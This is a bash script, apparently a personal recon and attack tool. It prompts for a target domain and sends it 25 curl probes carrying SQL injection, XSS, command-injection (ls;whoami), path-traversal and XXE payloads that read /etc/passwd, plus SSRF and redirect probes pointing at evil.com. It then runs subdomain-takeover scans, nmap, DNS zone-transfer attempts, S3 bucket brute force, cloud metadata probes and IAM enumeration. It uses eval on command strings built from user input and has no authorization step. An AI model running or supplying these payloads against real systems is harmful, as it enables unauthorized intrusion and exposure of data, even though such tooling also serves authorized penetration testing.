#!/bin/bash
set -euo pipefail
read -p "USERNAME: " USER
read -p "Set Custom Headers?: " HEADER
FINGERPRINTS="/home/$USER/Recon_NG/DVIR/tools/subjack/fingerprints.json"
# Normalize target input by stripping protocol
read -p "Target domain or I.P. Address (e.g. razer.com)?: " TARGET
LOGFILE="recon_ng_curl.log"

echo "[*] $(date '+%F %T') — Starting recon on $TARGET with header [$HEADER]" | tee -a "$LOGFILE"

declare -A PROBES

PROBES[1]='Header Injection|curl -s -H "'"$HEADER"'" https://'"$TARGET"
PROBES[2]='Open Redirect|curl -s -H "'"$HEADER"'" -L https://'"$TARGET"'/redirect?url=https://evil.com'
PROBES[3]='SSRF via GET|curl -s -H "'"$HEADER"'" https://'"$TARGET"'/fetch?url=http://127.0.0.1'
PROBES[4]='Method Tampering|curl -s -H "'"$HEADER"'" -X PUT https://'"$TARGET"'/resource'
PROBES[5]='CORS Misconfig|curl -s -H "'"$HEADER"'" -H "Origin: https://evil.com" -I https://'"$TARGET"
PROBES[6]='Host Header Injection|curl -s -H "'"$HEADER"'" -H "Host: evil.com" https://'"$TARGET"
PROBES[7]='User-Agent Spoofing|curl -s -H "'"$HEADER"'" -H "User-Agent: sqlmap" https://'"$TARGET"
PROBES[8]='XSS via Query|curl -s -H "'"$HEADER"'" "https://'"$TARGET"'/search?q=%3Cscript%3Ealert(1)%3C/script%3E"'
PROBES[9]='XSS via Header|curl -s -H "'"$HEADER"'" -H "Referer: <script>alert(1)</script>" https://'"$TARGET"
PROBES[10]='SQLi via Param|curl -s -H "'"$HEADER"'" https://'"$TARGET"'/item?id=1%27%20OR%20%271%27=%271'
PROBES[11]='SQLi via Header|curl -s -H "'"$HEADER"'" -H "X-User: 1 OR 1=1" https://'"$TARGET"
PROBES[12]='Command Injection|curl -s -H "'"$HEADER"'" https://'"$TARGET"'/run?cmd=ls;whoami'
PROBES[13]='Path Traversal|curl -s -H "'"$HEADER"'" https://'"$TARGET"'/download?file=../../etc/passwd'
PROBES[14]='File Inclusion|curl -s -H "'"$HEADER"'" https://'"$TARGET"'/include?file=../../etc/passwd'
PROBES[15]='Prototype Pollution|curl -s -H "'"$HEADER"'" -X POST -d "{\"__proto__\": {\"polluted\": true}}" https://'"$TARGET"'/api'
PROBES[16]='JSON Injection|curl -s -H "'"$HEADER"'" -X POST -H "Content-Type: application/json" -d "{\"user\":\"admin\"}" https://'"$TARGET"'/api/login'
PROBES[17]='XXE|curl -s -H "'"$HEADER"'" -X POST -H "Content-Type: application/xml" -d "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>" https://'"$TARGET"'/xml'
PROBES[18]='Redirect Chain|curl -s -H "'"$HEADER"'" -L https://'"$TARGET"'/chain?url=https://evil.com'
PROBES[19]='Cache Poisoning|curl -s -H "'"$HEADER"'" -H "X-Forwarded-Host: evil.com" https://'"$TARGET"
PROBES[20]='Cookie Manipulation|curl -s -H "'"$HEADER"'" -H "Cookie: session=evil" https://'"$TARGET"
PROBES[21]='Rate Limit Abuse|curl -s -H "'"$HEADER"'" https://'"$TARGET"'/api/ping'
PROBES[22]='Verbose Error Disclosure|curl -s -H "'"$HEADER"'" https://'"$TARGET"'/error?trigger=true'
PROBES[23]='Debug Endpoint|curl -s -H "'"$HEADER"'" https://'"$TARGET"'/debug'
PROBES[24]='Unvalidated Redirect|curl -s -H "'"$HEADER"'" https://'"$TARGET"'/forward?next=https://evil.com'
PROBES[25]='JWT Tampering|curl -s -H "'"$HEADER"'" -H "Authorization: Bearer fake.jwt.token" https://'"$TARGET"'/api'

for i in $(seq 1 25); do
  LABEL="${PROBES["$i"]%%|*}"
  CMD="${PROBES["$i"]#*|}"
  echo "[*] $(date '+%F %T') — Test $i: $LABEL" | tee -a "$LOGFILE"
  echo "[*] Command: $CMD" | tee -a "$LOGFILE"
  eval "$CMD" >> "$LOGFILE" 2>&1
done

LOGFILE="recon_ng_takeover.log"

function scan_takeovers {
  echo "[*] $(date '+%F %T') — Starting Subdomain Takeover Scan" | tee -a "$LOGFILE"
  subfinder -d "$TARGET" -o sub.txt
  if [[ ! -s sub.txt ]]; then
    echo "[!] No subdomains found. Skipping Subjack." | tee -a "$LOGFILE"
    return
  fi
  subjack -w sub.txt -t 50 -timeout 30 -ssl -v -o takeovers.txt -c "$FINGERPRINTS"
  if [[ -s takeovers.txt ]]; then
    echo "[*] Takeover candidates written to takeovers.txt" | tee -a "$LOGFILE"
  else
    echo "[!] No takeovers found or file not created." | tee -a "$LOGFILE"
  fi
}

scan_takeovers
echo "Starting Nmap scan against $TARGET at $(date)"
echo "[+] Starting Nmap scan against $TARGET at $(date)" >> recon_ng_nmap.log
nmap -Pn -sV -T4 "$TARGET" >> recon_ng_nmap.log 2>&1
echo "[+] Scan completed at $(date)" >> recon_ng_nmap.log
echo "Scan complete at $(date)"

echo "-=== Recon complete ==="[*] $(date '+%F %T')"[*]=== Recon complete ===-" | tee -a recon_ng.log

read -p "Start extended enumeration on $TARGET? (y/n): " EXT_ENUM

if [[ "$EXT_ENUM" =~ ^[Yy]$ ]]; then
  echo "[*] $(date '+%F %T') — Starting extended enumeration on $TARGET"
  NSPACE="extended_enum_$(date +%Y%m%d_%H%M%S)"
  mkdir -p "$NSPACE"

  ## 🧠 Network-Level Enumeration (no root required)
  if dig AAAA "$TARGET" +short | grep -q .; then
    echo "[*] IPv6 detected — running IPv6 scan"
    nmap -sT -6 -Pn --top-ports 1000 --open "$TARGET" -oA "$NSPACE/nmap_ipv6"
  else
    echo "[!] No IPv6 record found for $TARGET — skipping IPv6 scan"
  fi

  ## 🧬 DNS & Domain Enumeration
  echo "[*] DNS zone transfer attempt" | tee -a recon_ng_extended.log
  dig AXFR "$TARGET" @$(dig +short NS "$TARGET" | head -n1) > "$NSPACE/zone_transfer.txt"

  echo "[*] DNSSEC check" | tee -a recon_ng_extended.log
  dig +dnssec "$TARGET" > "$NSPACE/dnssec.txt"

  echo "[*] Subdomain brute force" | tee -a recon_ng_extended.log
  dnsx -d "$TARGET" -w /usr/share/wordlists/subdomains.txt -o "$NSPACE/dnsx_subs.txt"

  ## 🧱 Infrastructure & Cloud Enumeration
  echo "[*] S3 bucket enumeration" | tee -a recon_ng_extended.log
  for word in $(cat /usr/share/wordlists/s3_buckets.txt); do
    aws s3 ls "s3://$word.$TARGET" >> "$NSPACE/s3_enum.txt" 2>/dev/null
  done

  echo "[*] Cloud metadata probes" | tee -a recon_ng_extended.log
  curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/ > "$NSPACE/metadata_gcp.txt" || true
  curl -s http://169.254.169.254/latest/meta-data/ > "$NSPACE/metadata_aws.txt" || true

  echo "[*] IAM role enumeration (if creds available)" | tee -a recon_ng_extended.log
  aws iam list-roles > "$NSPACE/iam_roles.json" 2>/dev/null || echo "No IAM access" >> "$NSPACE/iam_roles.json"

  ## 🔐 Session Fixation Check
  echo "[*] Session fixation test" | tee -a recon_ng_extended.log
  curl -s -c "$NSPACE/cookie.txt" -b "$NSPACE/cookie.txt" "https://$TARGET/login" > "$NSPACE/login_response.html"
  curl -s -b "$NSPACE/cookie.txt" "https://$TARGET/dashboard" > "$NSPACE/session_reuse.html"
  echo "[*] Cookie reuse complete. Check for session continuity or privilege escalation manually." | tee -a recon_ng_extended
fi

echo "[*]---=ALL RECON COMPLETE VIEW RECON_NG LOGS FOR ENUMERATION DETAILS=---[*]"